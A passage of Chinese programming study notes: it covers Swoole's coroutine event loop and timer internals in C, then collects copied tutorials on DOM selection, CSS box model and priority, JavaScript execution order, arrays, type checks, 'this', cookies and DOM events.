  上面提到，创建协程时，注册了一个函数swoole_event_wait，在生命周期register_shutdown阶段会执行该函数，开始Swoole的事件循环，阻挡了php生命周期的结束。函数swoole_event_wait底层就是调用main_reactor->wait等待fd读写事件的产生；我们以epoll为例讲述事件循环的逻辑：
static int swReactorEpoll_wait(swReactor *reactor, struct timeval *timeo)
{
    while (reactor->running > 0)
    {
        n = epoll_wait(epoll_fd, events, max_event_num, swReactor_get_timeout_msec(reactor));
        
        if (n == 0)
        {
            if (reactor->onTimeout != NULL)
            {
                reactor->onTimeout(reactor);
            }
            SW_REACTOR_CONTINUE;
        }
        
        for (i = 0; i < n; i++)
        {
            if ((events[i].events & EPOLLIN) && !event.socket->removed)
            {
                handle = swReactor_getHandle(reactor, SW_EVENT_READ, event.type);
                ret = handle(reactor, &event);
                
            }
            
            if ((events[i].events & EPOLLOUT) && !event.socket->removed)
            {
                handle = swReactor_getHandle(reactor, SW_EVENT_WRITE, event.type);
                ret = handle(reactor, &event);
               
            }
        }
    }
}
•swReactorEpoll_wait是对函数epoll_wait的封装；当有读写事件发生时，执行相应的handle，根据上面的讲解我们知道读写事件的handle分别为readable_event_callback和writable_event_callback；
int Socket::readable_event_callback(swReactor *reactor, swEvent *event)
{
    Socket *socket = (Socket *) event->socket->object;

    socket->read_co->resume();

}
•可以看到函数readable_event_callback只是简单的恢复read_co协程即可；
•当epoll_wait发生超时，最终调用的是函数swReactor_onTimeout，该函数会从Swoole维护的一系列定时任务swTimer中查找已经超时的定时任务，同时执行其callback回调；
while ((tmp = swHeap_top(timer->heap)))
{
    tnode = tmp->data;
    if (tnode->exec_msec > now_msec || tnode->round == timer->round)
    {
        break;
    }

    timer->_current_id = tnode->id;
    if (!tnode->remove)
    {
        tnode->callback(timer, tnode);
    }
    
    ……
}

//该定时任务没有超时，需要更新需要更新_swTimer中最早的定时任务触发时间_next_msec
long next_msec = tnode->exec_msec - now_msec;
if (next_msec <= 0)
{
    next_msec = 1;
}
//同时更新main_reactor对象的超时时间，实现函数为swReactorTimer_set
timer->set(timer, next_msec);

•该callback回调函数即为上面设置的timer_callback：
void Socket::timer_callback(swTimer *timer, swTimer_node *tnode)
{
    Socket *socket = (Socket *) tnode->data;
    socket->set_err(ETIMEDOUT);
    if (likely(tnode == socket->read_timer))
    {
        socket->read_timer = nullptr;
        socket->read_co->resume();
    }
    else if (tnode == socket->write_timer)
    {
        socket->write_timer = nullptr;
        socket->write_co->resume();
    }
}
•同样的，timer_callback函数只是简单的恢复read_co或者write_co协程即可

sleep实现

  Co::sleep()的实现函数为PHP_METHOD(swoole_coroutine_util, sleep)，该函数通过调用Coroutine::sleep实现了协程休眠的功能：
int Coroutine::sleep(double sec)
{
    Coroutine* co = Coroutine::get_current_safe();
    if (swTimer_add(&SwooleG.timer, (long) (sec * 1000), 0, co, sleep_timeout) == NULL)
    {
        return -1;
    }
    co->yield();
    return 0;
}

  可以看到，与socket读写事件超时处理相同，sleep内部实现时通过swTimer_add添加定时任务，同时换出当前协程实现的。该定时任务会导致main_reactor对象的超时时间的改变，即修改了epoll_wait的超时时间。

  sleep的超时处理函数为sleep_timeout，只需要换入该阻塞协程对象即可，实现如下：
static void sleep_timeout(swTimer *timer, swTimer_node *tnode)
{
    ((Coroutine *) tnode->data)->resume();
}
```

## 前端篇

### 原生获取 DOM 节点，属性
```
https://www.cnblogs.com/zero18/p/10998642.html
JS获取DOM元素的方法（8种）

通过ID获取（getElementById）
通过name属性（getElementsByName）
通过标签名（getElementsByTagName）
通过类名（getElementsByClassName）
通过选择器获取一个元素（querySelector）
通过选择器获取一组元素（querySelectorAll）
获取html的方法（document.documentElement）
document.documentElement是专门获取html这个标签的
获取body的方法（document.body）
document.body是专门获取body这个标签的。
1.通过ID获取（getElementById）

document.getElementById('id')
上下文必须是document。
必须传参数，参数是string类型，是获取元素的id。
返回值只获取到一个元素，没有找到返回null。
2.通过name属性（getElementsByName）

document.getElementsByName('name')
上下文必须是document。内容
必须传参数，参数是是获取元素的name属性。
返回值是一个类数组，没有找到返回空数组。
3.通过标签名（getElementsByTagName）

复制代码
var obj = document.getElementsByTagName('div');
                for(let i = 0; i<obj.length; i++){
                        obj[i].onclick = function(e){
                            console.log(i)
                        }
                    }
复制代码
上下文可以是document，也可以是一个元素，注意这个元素一定要存在。
参数是是获取元素的标签名属性，不区分大小写。
返回值是一个类数组，没有找到返回空数组
4.通过类名（getElementsByClassName

复制代码
var obj1 = document.getElementsByClassName('animated')
                // console.log
                0:div.app.animated
                1:div#login.login.animated.rubberBand
                2:div#reg.reg.animated.shake
                3:div#kefu.kefu.animated.swing
                4:div#LoginState.state.animated.bounce
                5:div.loginState.animated
                6:div.regState.animated
                7:div.pop.animated
复制代码
上下文可以是document，也可以是一个元素。
参数是元素的类名。
返回值是一个类数组，没有找到返回空数组。
5.通过选择器获取一个元素（querySelector）

document.querySelector('.animated')
上下文可以是document，也可以是一个元素。
参数是选择器，如：”div .className”。
返回值只获取到第一个元素。
6.通过选择器获取一组元素（querySelectorAll）

document.querySelector('.animated')
上下文可以是document，也可以是一个元素。
参数是选择器，如：”div .className”。
返回值是一个类数组。
转载于:查看原创请点击此处

每天进步一点点！！
            </div>
        </div>
        <script
            type="text/javascript">var allowComments = true, cb_blogId = 435113, cb_entryId = 10131782, cb_blogApp = currentBlogApp, cb_blogUserGuid = '9c5d6448-89d6-4f8c-fd00-08d5a823ae5e', cb_entryCreatedDate = '2018/12/17 15:27:00'; loadViewCount(cb_entryId); var cb_postType = 1; var isMarkdown = false;</script>

    </div>
    <!--end: topics 文章、评论容器-->
</div>
```

### 盒子模型
```
https://www.runoob.com/css/css-boxmodel.html
CSS 盒子模型(Box Model)
所有HTML元素可以看作盒子，在CSS中，"box model"这一术语是用来设计和布局时使用。

CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。

盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。

下面的图片说明了盒子模型(Box Model)：


CSS box-model
不同部分的说明：

Margin(外边距) - 清除边框外的区域，外边距是透明的。
Border(边框) - 围绕在内边距和内容外的边框。
Padding(内边距) - 清除内容周围的区域，内边距是透明的。
Content(内容) - 盒子的内容，显示文本和图像。
为了正确设置元素在所有浏览器中的宽度和高度，你需要知道的盒模型是如何工作的。

元素的宽度和高度
Remark重要: 当您指定一个 CSS 元素的宽度和高度属性时，你只是设置内容区域的宽度和高度。要知道，完整大小的元素，你还必须添加内边距，边框和边距。

下面的例子中的元素的总宽度为300px：

实例
div {
    width: 300px;
    border: 25px solid green;
    padding: 25px;
    margin: 25px;
}

尝试一下 »
让我们自己算算：
300px (宽)
+ 50px (左 + 右填充)
+ 50px (左 + 右边框)
+ 50px (左 + 右边距)
= 450px

试想一下，你只有250像素的空间。让我们设置总宽度为250像素的元素:

实例
div {
    width: 220px;
    padding: 10px;
    border: 5px solid gray;
    margin: 0; 
}

尝试一下 »
最终元素的总宽度计算公式是这样的：

总元素的宽度=宽度+左填充+右填充+左边框+右边框+左边距+右边距

元素的总高度最终计算公式是这样的：

总元素的高度=高度+顶部填充+底部填充+上边框+下边框+上边距+下边距

浏览器的兼容性问题
一旦为页面设置了恰当的 DTD，大多数浏览器都会按照上面的图示来呈现内容。然而 IE 5 和 6 的呈现却是不正确的。根据 W3C 的规范，元素内容占据的空间是由 width 属性设置的，而内容周围的 padding 和 border 值是另外计算的。不幸的是，IE5.X 和 6 在怪异模式中使用自己的非标准模型。这些浏览器的 width 属性不是内容的宽度，而是内容、内边距和边框的宽度的总和。

虽然有方法解决这个问题。但是目前最好的解决方案是回避这个问题。也就是，不要给元素添加具有指定宽度的内边距，而是尝试将内边距或外边距添加到元素的父元素和子元素。

IE8 及更早IE版本不支持设置填充的宽度和边框的宽度属性。

解决IE8及更早版本不兼容问题可以在HTML页面声明 <!DOCTYPE html>即可。
```

### CSS 文件、style 标签、行内 style 属性优先级
```
　　一个网页由html元素与CSS样式合作打造，html元素用来排版布局，CSS样式用来修饰。而html元素与CSS样式是各自独立的，各发挥各的作用。CSS样式可以在三个地方定义，分别为：CSS文件、html网页内和元素的style属性中，问题来了，如果同时在两个地方定义了同一个CSS样式，那么谁发生作用？在CSS样式中，不存在两个同名同属性的CSS共同发挥作用的问题，所以只有CSS作用顺序或者说CSS优先级的问题。对于不同名并不同属性的CSS样式，它们可以同时修饰html元素，因而一个 class 中可以有多个CSS样式。

　　我们已经知道在CSS文件、html页与style属性中都可以定义CSS样式，它们的作用顺序优先级遵循离 class 近的原则，说到这里想必你已经知道谁先谁后了。

 

　　一、CSS优先级
　　1、style属性中的CSS样式；

　　2、html页中<style></style>之间的CSS样式；

　　3、CSS文件中的CSS样式。

　　从上面的排序可以看出，CSS优先级确实遵循离 class 属性近的原则。

 

　　二、CSS优先级举例
　　html元素：

　　<div class="cssorder" style="color:Red">CSS优先级，文件、本页与style属性谁先谁后</div>

　　CSS样式：

　　<style type="text/css">
　　　cssorder{color:Blue; width:350px; height:30px; border:1px solid #929292; line-height:28px; padding-left:8px;}
    </style>
CSS优先级，文件、本页与style属性谁先谁后
　　从效果图中可以看出，如果在CSS样式和style属性中同时定义了，则style属性中的发挥作用。例如：在CSS样式 cssorder 中把 color 定义为“蓝色”，在style属性中把 color 定义为“红色”，结果文字显示为红色。而style属性中没有定义的，则CSS样式 cssorder 定义了的，则CSS样式中的发挥作用。
```

### HTML 与 JS 运行顺序（页面 JS 从上到下）
```
https://www.cnblogs.com/xiaoxiaoqiang001/p/5331322.html
JS在html中的执行顺序
    一般来说在html页面中嵌入Javascript的方式有下面几种：1.放在页面的<script></script>标记之间；2.由<script>标记的src属性引入外部的js文件；3.放在页面元素的事件处理程序中，比如button的onclick事件中；4.作为URL的主体，使用Javascript:协议，比如<a href="window.open("about:blank");"></a>;5.Javascript本身的document.write()写入的JavaScript代码；6.利用Ajax异步获取javascript代码.其中3,4需要事件的事件的触发才能执行，除非特别设置一般在页面加载时不会执行。5，6可以看做是js代码动态调用执行的，一般是在调用该代码的js执行时执行。

  下面看看<script></script>在html中所放的不同位置来看js的执行顺序。

js代码在js外部文件和<script></script>内的区别：

1
2
3
4
5
6
7
8
9
10
11
12
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript"src="test.js" ></script>
    <script type="text/javascript">
        alert("head中js");
        </script>
</head>
<body>
</body>
</html>
其中test.js为外部js文件，代码为：

1
alert("文件中js");
程序运行结果为先打印"文件中js"，再打印"head中js"，如果把<script src="test.js">放在后面，则是先输出"head中js",即浏览器是按<script>载入的先后顺序执行的。

一般来说每个脚本定义的全局变量和函数，都可以被后面执行的脚本所调用。变量的调用必须是在前面已经声明, 否则是undefined。而函数的调用可以在函数定义之前,前提是函数调用与定义在同一个<script></script>中，看下面的代码：

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript">
        alert(str);//程序打印出，undefined
       Sayhello("小明");//程序打印出，小明你好
        function Sayhello(name)
        {
            alert(name+"你好!");
        }
        var str="abcd";
        </script>
</head>
<body>
</body>
</html>
复制代码
函数定义可以出现在函数调用的后面，但是如果是分别在两段代码，且函数调用在前面代码中，则会报函数未定义错误。

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript">
        Sayhello("小明");//浏览器报错Sayhello未定义
    </script>
    <script type="text/javascript">
        function Sayhello(name)
        {
            alert(name+"你好!");
        }
        var str="abcd";
        </script>
    <script type="text/javascript">
        Sayhello("小红");
        alert(str);
        </script>
</head>
<body>
</body>
</html>
复制代码
程序正常打印''小红你好''和''abcd''。

在实际js的编程中，可能会页面<script>标签内的js代码中调用外部js文件中的变量或函数，这个需要js文件的加载在前，而调用在后。下面的代码可以说明：

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript" src="test.js"></script>
   <script type="text/javascript">
       alert(num1);
       alert(num2)
      alert(sum(3,7));
   </script>
</head>
<body>
</body>
</html>
复制代码
test.js中的代码：

var num1=2;
var num2=3;
function sum(a,b)
{
    return a+b;
}
程序正常输出，如果把test.js放在后面，调用却在前面，会出现undefined的错误。如果把js文件test.js放在后可以调用前面html页面<script>标签中的变量和函数，也可以调用前面的js文件中定义的变量和函数。

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
   <script type="text/javascript">
       var string1="abc";
       var string2="def";
       function Print(str1,str2)
       {
         alert(str1+str2) ;
       }
   </script>
    <script type="text/javascript" src="test.js"></script>
</head>
<body>
</body>
</html>
复制代码
上面程序中string1，string2，Print声明或定义在前，在test.js中调用，test.js的代码为：

alert(string1);//输出abc
alert(string2);//输出def
var str1="12";
var str2="34";
Print(str1,str2);//输出1234
后面引用的js文件调用前面js文件中定义的变量和函数，把前面的html改为如下：

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript" src="test02.js"></script>
    <script type="text/javascript" src="test.js"></script>
</head>
<body>
</body>
</html>
复制代码
test.js中的代码不变，调用前面test02.js中定义变量和函数，test02.js的代码如下：

var string1="abc";
var string2="def";
function Print(str1,str2)
{
    alert(str1+str2) ;
}
程序运行结果与前面一样，上面程序交换test.js和test02.js的先后会出现undefined的错误。这充分说明js外部文件和页面内<script>标签里的js代码一样，让先后顺序加载执行的。
下面来看看<script>加入html的不同位置执行的顺序：在<head>和<body>中以及与页面元素加载的先后关系

下面的程序对比<head>和<body>中js的执行顺序：

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript">
        alert("我在head中");
    </script>
</head>
<body>
<script type="text/javascript">
    alert("我在body中");
</script>
</body>
</html>
复制代码
上面程序先弹出"我在head中"后body中，与页面加载的顺序一致。放入<body>中的js随页面元素加载时执行。可以把js放在</html>的后面，在页面加载完成后执行，相当于onload事件中的代码。

综合上面所述情况可以归结为一点，即JavaScript代码是按页面加载的先后顺序执行的。（注上述代码在不同浏览器中执行的结果会有一些小差异）。
```

### JS 数组操作
```
https://www.cnblogs.com/lzm1989/p/5967815.html
shift:删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefined 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.shift(); //a:[2,3,4,5] b:1  


unshift:将参数添加到原数组开头，并返回数组的长度 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.unshift(-2,-1); //a:[-2,-1,1,2,3,4,5] b:7   

注:在IE6.0下测试返回值总为undefined，FF2.0下测试返回值为7，所以这个方法的返回值不可靠，需要用返回值时可用splice代替本方法来使用。 

pop:删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefined 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.pop(); //a:[1,2,3,4] b:5  


push:将参数添加到原数组末尾，并返回数组的长度 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.push(6,7); //a:[1,2,3,4,5,6,7] b:7  


concat:返回一个新数组，是将参数添加到原数组中构成的 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.concat(6,7); //a:[1,2,3,4,5] b:[1,2,3,4,5,6,7]  


splice(start,deleteCount,val1,val2,...):从start位置开始删除deleteCount项，并从该位置起插入val1,val2,... 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.splice(2,2,7,8,9); //a:[1,2,7,8,9,5] b:[3,4]   
var b = a.splice(0,1); //同shift   
a.splice(0,0,-2,-1); var b = a.length; //同unshift   
var b = a.splice(a.length-1,1); //同pop   
a.splice(a.length,0,6,7); var b = a.length; //同push  


reverse:将数组反序 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.reverse(); //a:[5,4,3,2,1] b:[5,4,3,2,1]  


sort(orderfunction):按指定的参数对数组进行排序 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.sort(); //a:[1,2,3,4,5] b:[1,2,3,4,5]  


slice(start,end):返回从原数组中指定开始下标到结束下标之间的项组成的新数组 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.slice(2,5); //a:[1,2,3,4,5] b:[3,4,5]  


join(separator):将数组的元素组起一个字符串，以separator为分隔符，省略的话则用默认用逗号为分隔符 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.join("|"); //a:[1,2,3,4,5] b:"1|2|3|4|5"  




数组是JavaScript提供的一个内部对象，它是一个标准的集合，我们可以添加(push)、删除(shift)里面元素，我们还可以通过for循环遍历里面的元素，那么除了数组我们在JavaScript里还可以有别的集合吗? 

　　由于JavaScript的语言特性，我们可以向通用对象动态添加和删除属性。所以Object也可以看成是JS的一种特殊的集合。下面比较一下Array和Object的特性: 


Javascript代码  收藏代码
　　//Array:  
  
/*新建:*/var ary = new Array(); 或 var ary = [];   
/*增加:*/ary.push(value);   
/*删除:*/delete ary[n];   
/*遍历:*/for ( var i=0 ; i < ary.length ; ++i ) ary[i];  
  
　　//Object:  
  
/*新建:*/var obj = new Object(); 或 var obj = {};   
/*增加:*/obj[key] = value; (key为string)   
/*删除:*/delete obj[key];   
/*遍历:*/for ( var key in obj ) obj[key];  


　　从上面的比较可以看出Object完全可以作为一个集合来使用，在使用Popup窗口创建无限级Web页菜单(3)中我介绍过Eric实现的那个__MenuCache__，它也就是一个模拟的集合对象。 

　　如果我们要在Array中检索出一个指定的值，我们需要遍历整个数组: 

　　 
代码: 

Javascript代码  收藏代码
var keyword = ;   
　　for ( var i=0 ; i < ary.length ; ++i )   
　　{   
　　if ( ary[i] == keyword )   
　　{   
　　// todo   
　　}   
　　}  




　　而我们在Object中检索一个指定的key的条目，只需要是要使用: 

　　 
代码: 

Javascript代码  收藏代码
var key = '';   
　　var value = obj[key];   
　　// todo  


　Object的这个特性可以用来高效的检索Unique的字符串集合，遍历Array的时间复杂度是O(n)，而遍历Object的时间复杂度是O(1)。虽然对于10000次集合的for检索代价也就几十ms，可是如果是1000*1000次检索或更多，使用Object的优势一下就体现出来了。在此之前我做了一个mapping，把100个Unique的字符mapping到1000个字符串数组上，耗时25-30s!后来把for遍历改成了Object模拟的集合的成员引用，同样的数据量mapping，耗时仅1.7-2s!!! 

　　对于集合的遍历效率(从高到低):var value = obj[key]; > for ( ; ; ) > for ( in )。效率最差的就是for( in )了，如果集合过大，尽量不要使用for ( in )遍历。
```

### 类型判断
```
https://www.cnblogs.com/wilfredo/p/10489142.html
因为JS的arguments是弱类型的。所以多数场合下，对于arguments进行判断，然后针对不同类型进行不同处理（类似Java的重载）。

JS语言中数据类型共有6种，5种基本数据类型：Unfined, Null, Boolean, Number, String，还有特殊类型Object。

判断方法有很多，这里列举三个： typeof， instanceof, Object.prototype.toString.call()。下面分别说明其用途：

1. typeof

　　用的最频繁的一种判断方式，适用于基本类型和函数判断。不适用于Object类型的进一步判断。

　　

　　补充：

当变量不存在时，if (variable) 会抛出异常，而 typeof variable === 'undefined'则适用
typeof NaN 为 "number"，针对NaN需要进一步结合 isNaN()来判断
　2. instanceof

　　a instanceof b: 判断b是否是a的原型，返回 true / false

　　适用于引用类型的进一步判断。　

var a = [];

//针对array的检测
console.log(a instanceof Array); //true
console.log(a instanceof Object); //true,因为Array是Object子集
　　进一步的了解，可以参考https://www.cnblogs.com/Trr-984688199/p/6180040.html。

　3. Object.prototype.toString.call()

复制代码
var a = [1, 2];
Object.prototype.toString.call(a);     // "[object Array]"

a = {};
Object.prototype.toString.call(a);  　　// "[object Object]"

a = "123";
Object.prototype.toString.call(a);  　　// "[object String]"

a = 1;
Object.prototype.toString.call(a);  　　// "[object Number]"

a = true;
Object.prototype.toString.call(a);  　　// "[object Boolean]"

a = function() {};
Object.prototype.toString.call(a);  　　// "[object Function]"
复制代码
 

 4. 其他 

Array.isArray： 用于确定传递的值是否是一个 Array， 返回true / false
```

### this 作用域
```
https://www.cnblogs.com/wxy1233/p/9892264.html
一.作用域:浏览器给js的一个生存环境 (栈内存)。

二.作用域链:js中的关键字var和fuanction都可以提前声明和定义，提前声明和定义的放在我们的内存地址 (堆内存)中。

     然后js从上到下逐行执行，遇到变量就去内存地址查找是否存在这个变量，如果有就使用，没有就继续向父级作用域

     查找直到window下结束，这种查找机制叫做作用域链。  

 三.Js代码中存在大量的变量和函数，我们在使用它们的时候一定要知道它们到底归属谁。

四.This

    1.this是js的一个关键字，指定一个对象然后去替代它。

      函数内的this和函数外的this，函数内的this指向行为发生的主体。函数外的this都指向window没有意义。



 为什么还是window？

因为浏览器执行js代码的时候在执行chifan()这个函数的时候查找到变量chifan的归属是window，在window下的

变量可以写成window.chifan函数可以写成window.chifan()

   2.函数内的this和函数在什么环境中定义没有关系，而只和自己的主体有关。

   3.主体怎么找？

            就看函数 (方法)带不带“.”，如果函数和方法执行时带“.”，那么this就指向“.”前面的对象，如果不带“.”，就

           指向window  

   4.自执行函数里面的this都指向window。



     This和变量面试题，先找this的主体是谁，然后把它换成那个主体就行啦

   5.给元素中的某一事件绑定方法，当事件触发时，执行绑定的方法，方法中的this指向当前元素。



     重点是函数套函数的时候，不管它怎么定义，关键是看它执行时候的主体。

     360经典面试



js的数据类型

      基本数据类型: String  Undefined Null Boolean  Number

      引用数据类型: Object  Array Function

     二者的区别:

    基本数据类型就是简单的操作值，引用数据类型，把引用地址赋值给变量



堆内存

      就是存放代码块的，存放形式有两种，一种是对象以键值对的形式存放   

     另一种就是函数 以字符串的形式存放。



案例:



引用数据类型的赋值，是把引用地址赋给它，在修改属性的时候，通过地址查找然后改掉。





应用数据类型，如何操作？

      先通过引用地址去查找堆内存中的代码，然后再去修改

 

This研究在函数内部

    在js中的函数形式的种类

        1.   普通函数   function  fn(){}    var fn = function ()

        2.  类

   对象 Object

       对象里面的数据以键值对的形式存在。跟json一样。

       1.  单例模式



我们把变量zhang的li叫“命名空间”

作用域和堆内存的区别

      作用域是函数执行的时候产生 fn()

      函数执行的时候首先会开辟一个新的内存空间叫栈内存 (环境或作用域)

     数据类型在赋值的时候会开辟一个新的内存空间叫堆内存 (存放代码块的)

     二者都会形成一个内存地址

生成对象的单例模式

    优势，每个对象都是独立的，即便属性起的名字一样，不会相互干扰，方便现在流行的

   开发模式“模块化开发”。如果需要使用里面的属性，用运算符 如 zhang.name 或 zhang

["name"]，判断一个属性是不是这个对象的用in运算符 如 “name”in zhang 如果遍历这个

对象用for(attr in zhang){}

     缺点,不可以批量生产，只能一个一个去创建。
```

### .map() 与 this 具体使用场景分析
```
https://www.cnblogs.com/mhtss/p/11334034.html
相同点：

1.都是循环遍历数组中的每一项

2.每次执行匿名函数都支持三个参数，参数分别为item（当前每一项），index（索引值），arr（原数组）

3.匿名函数中的this都是指向window

4.只能遍历数组

 

不同点：

map（）

map方法返回一个新的数组，数组中的元素为原始数组调用函数处理后的值

也就是map（）进行处理之后返回一个新的数组

⚠️注意：map（）方法不会对空数组进行检测

map方法不会改变原始数组

var arr = [0,2,4,6,8];
var str = arr.map(function(item,index,arr){
console.log(this); //Window
console.log(this);
console.log(item);
console.log('原数组arr：',arr); // 会执行五次
return item/2;},this);console.log(str); //[0,1,2,3,4]
forEach

 

forEach方法用于调用数组的每个元素，将元素传给回调函数

⚠️注意： forEach对于空数组是不会调用回调函数的 ，

没有返回一个新数组&没有返回值

应用场景：为一些相同的元素，绑定事件处理器！

不可链式调用 

var arr = [0,2,4,6,8]

var sum =0;

var str = arr.forEach(item,index.arr){sum+= item;console.log("sum的值为：",sum);})


分享文章如有侵权，版权等问题，请私信联系我，我将第一时间删除或修正。
https://blog.csdn.net/weixin_42881768/article/details/104648611
1、
       默认绑定：没有明确隶属对象的函数，被直接执行，一般都是window（默认绑定this）；

2、
       隐式绑定：有所属对象的函数，被执行，一般是当前函数的所属对象（隐式绑定this）；
       隐式丢失：如果作为参数，传到另一个函数中，那么丢失原本的对象，变成window。

3、
       强制绑定：利用函数的方法（call、apply、bind），改成谁，this就是谁；

4、
       new绑定：函数被new执行后，函数内部的this会指向new出来的实例。

注意：this永远跟着当前函数走，this永远是一个对象，永远在执行时才能确定指向

扩展：
       ES6中的箭头函数没有自己的this，指向外层this，函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。
```

### Cookie 读写
```
https://www.cnblogs.com/rxbook/p/11773553.html
<!doctype html>
<html>
    
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>
            test
        </title>
    </head>
    
    <body>
        <script type="text/javascript">
            //写cookies
            function setCookie(name, value) {
                var Days = 30;
                var exp = new Date();
                exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
                document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
            }

            //读取cookies 
            function getCookie(name) {
                var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");

                if (arr = document.cookie.match(reg)) return unescape(arr[2]);
                else return null;
            }

            //删除cookies 
            function delCookie(name) {
                var exp = new Date();
                exp.setTime(exp.getTime() - 1);
                var cval = getCookie(name);
                if (cval != null) document.cookie = name + "=" + cval + ";expires=" + exp.toGMTString();
            }
            setCookie("name", "peter");
            setCookie("sex", "man");
            setCookie("age", "19");

            console.log(getCookie("name"));
            console.log(getCookie("sex"));
            console.log(getCookie("age"));
        </script>
    </body>

</html>
```

### JQuery 操作
```
https://www.cnblogs.com/gaohuayan/p/11304745.html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>操作页面的三步骤</title>
</head>
<body>
    <h1>操作页面的三步骤</h1>
    <div class="box">
        <h1>box h1</h1>
    </div>
</body>
<script>
    // 1、获取页面标签
    // 2、设置操作的激活条件 - 事件
    // 3、具体的操作方式 - 内容 | 样式 | 事件 | 文档结构

    // 1
    let body = document.querySelector('body');
    let box = document.querySelector('.box');
    // 父级调用选择器方法，只完成自己内部的检索
    let body_h1 = body.querySelector('h1');
    console.log(body_h1);
    let box_h1 = box.querySelector('h1');
    console.log(box_h1);

    // 2
    body_h1.onclick = function () {
        // console.log('你丫点我了')
        // 3
        if (box_h1.style.color != 'red') {
            box_h1.style.color = 'red';
            box_h1.style.backgroundColor = 'orange';
        } else {
            box_h1.style.color = 'black';
            box_h1.style.backgroundColor = 'white';
        }
    }
</script>
</html>
js事件
鼠标事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>鼠标事件</title>
    <style>
        .box {
            width: 200px;
            height: 200px;
            background-color: pink;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="box"></div>
</body>
<script>
    let box = document.querySelector('.box');
    // 单击
    box.onclick = function () {
        console.log('单击了', this)
    };
    // 双击
    box.ondblclick = function () {
        console.log('双击了')
    };
    // 右键
    box.oncontextmenu = function () {
        console.log('右键了');
        // 有些事件有系统默认动作，取消默认动作可以返回 false
        return false;
    };
    // 悬浮
    box.onmouseover = function () {
        console.log('悬浮了');
    };
    // 移开
    box.onmouseout = function () {
        console.log('移开了');
    };
    // 移动
    box.onmousemove = function () {
        console.log('移动了');
    };
    // 按下
    box.onmousedown = function () {
        console.log('按下了');
    };
    // 抬起
    box.onmouseup = function () {
        console.log('抬起了');
    };
</script>
</html>
文档事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>文档事件</title>
    <style>
        body {
            height: 3000px;
        }
    </style>
    <script>
        // 页面加载成功
        window.onload = function () {
            console.log(h1)
        }
    </script>
</head>
<body>
    <h1 id="h1">hhhhh</h1>
</body>
<script>
    let body = document.querySelector('body');
    // 页面滚动事件
    document.onscroll = function (ev) {
        console.log('滚动了');
        // console.log(ev);
        // console.log(window.scrollY);
        if (window.scrollY >= 500) {
            body.style.backgroundColor = 'red';
        } else {
            body.style.backgroundColor = 'white';
        }
    }
</script>
</html>
键盘事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>键盘事件</title>
</head>
<body>
    <h1>键盘事件</h1>
    <input type="text">
</body>
<script>
    let inp = document.querySelector('input');

    inp.onkeydown = function () {
        console.log('按下')
    };
    inp.onkeyup = function () {
        console.log('抬起')
    }

</script>
</html>
表单事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>表单事件</title>
    <style>
        /*表单的内外边框*/
        input {
            border: 2px solid pink;
        }
        input:focus {
            outline: 2px solid yellow;
        }
    </style>
</head>
<body>
<form action="">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="登录">
</form>
</body>
<script>
    let form = document.querySelector('form');
    let submit = document.querySelector('[type="submit"]');
    let usr = document.querySelector('[type="text"]');

    // 表单提交事件：表单默认也有提交数据的动作，也可以取消
    form.onsubmit = function () {
        console.log('提交了');
        return false;
    };

    // 获取焦点
    usr.onfocus = function () {
        console.log('获取焦点')
    };

    // 失去焦点
    usr.onblur = function () {
        console.log('失去焦点')
    };

</script>
</html>
事件对象
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>事件对象</title>
</head>
<body>
<input type="text" class="inp">
</body>
<script>
    inp = document.querySelector('.inp');
    inp.onkeydown= function (ev) {
        console.log(ev);
        // console.log(ev.keyCode);

        if (ev.keyCode === 13) {
            console.log('回车了')
        }
        if (ev.ctrlKey && ev.keyCode === 13) {
            console.log('消息发送了')
        }
    };

    document.onclick = function (ev) {
        console.log(ev);
        // 鼠标点击点
        console.log(ev.clientX, ev.clientY);
    }
    
</script>
</html>
js操作内容
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>内容操作</title>
</head>
<body>
    <h1 class="title">标题</h1>
    <input type="text" class="title">
    <button class="btn">改标题</button>
</body>
<script>
    let h1 = document.querySelector('h1.title');
    let inp = document.querySelector('input.title');
    let btn = document.querySelector('.btn');

    // 内容操作：value | innerText | innerHTML
    btn.onclick = function () {
        // 拿到输入框的内容
        inp_value = inp.value;
        if (inp_value) {
